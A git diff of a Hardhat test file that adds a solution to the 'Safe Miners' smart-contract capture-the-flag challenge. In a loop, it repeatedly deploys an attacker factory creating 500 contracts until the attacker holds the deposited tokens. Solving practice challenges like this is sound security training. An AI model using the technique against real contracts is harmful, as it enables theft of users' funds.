@@ -23,7 +23,23 @@ describe('[Challenge] Safe Miners', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        //Can't have timeouts because this will take a while
+        this.timeout(0);
+
+        let attempt = 1;
+        let attackerBalance = 0;
+        do {
+            console.log("## ATTEMPT: ", attempt);
+            // Deploy a factory that deploys 500 attackers until we have the tokens
+            await (await ethers.getContractFactory('SafeMinersAttackerFactory', attacker)).deploy(this.token.address, 500);
+            
+            //Check the attacker balance
+            attackerBalance = await this.token.balanceOf(attacker.address);
+            console.log("## CURRENT BALANCE: ", ethers.utils.formatEther(attackerBalance));
+            console.log("## ------------------");
+
+            attempt++;
+        } while(attackerBalance < DEPOSIT_TOKEN_AMOUNT)
     });
 
     after(async function () {
